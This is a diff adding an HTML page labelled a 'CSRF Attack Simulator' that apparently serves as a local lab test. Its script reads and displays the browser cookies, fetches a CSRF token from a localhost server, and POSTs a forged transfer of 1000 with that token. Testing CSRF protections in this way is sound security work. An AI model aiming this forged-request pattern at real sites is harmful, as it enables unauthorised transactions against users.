@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Simulator (legit client)</title>
+</head>
+<body>
+<h1>Sending forged transfer (with CSRF token)</h1>
+<pre id="output">Getting CSRF token…</pre>
+<pre id="cookies">Reading browser cookies…</pre>
+
+<script>
+    const output = document.getElementById('output');
+    const cookiesPre = document.getElementById('cookies');
+
+    // Show all cookies
+    cookiesPre.textContent = `📦 document.cookie =\n${document.cookie || '[No cookies visible via JS]'}`;
+
+    fetch('http://127.0.0.1:8080/csrf', {
+      credentials: 'include'
+    })
+      .then(res => res.text())
+      .then(body => {
+        const tokenFromBody = body.replace("csrf=", "").trim();
+
+        // Try reading the CSRF token from document.cookie
+        const csrfCookie = document.cookie
+          .split('; ')
+          .find(row => row.startsWith('CSRF-TOKEN='))
+          ?.split('=')[1];
+
+        const csrfToken = csrfCookie || tokenFromBody;
+        console.log("🍪 All cookies:", document.cookie);
+        // Log where token came from
+        if (csrfCookie) {
+          output.textContent = `✅ CSRF token from cookie:\n${csrfToken}`;
+        } else if (tokenFromBody) {
+          output.textContent = `⚠️ Token not in cookie — used from response body:\n${csrfToken}`;
+        } else {
+          output.textContent = '❌ No CSRF token found in cookie or body.';
+          return;
+        }
+
+        // Attempt to send forged request
+        const formData = new URLSearchParams();
+        formData.append("amount", "1000");
+        formData.append("to", "user");
+        formData.append("csrfToken", csrfToken);
+
+        fetch('http://127.0.0.1:8080/api/transfer/form', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-CSRF-TOKEN': csrfToken
+          },
+          credentials: 'include',
+          body: formData
+        })
+          .then(res => res.ok ? res.text() : Promise.reject(res.status + " " + res.statusText))
+          .then(result => {
+            output.textContent += '\n\n✅ Transfer success:\n' + result;
+          })
+          .catch(err => {
+            output.textContent += '\n\n❌ Transfer failed:\n' + err;
+          });
+      })
+      .catch(err => {
+        output.textContent = '❌ Error fetching CSRF token:\n' + err;
+      });
+</script>
+</body>
+</html>
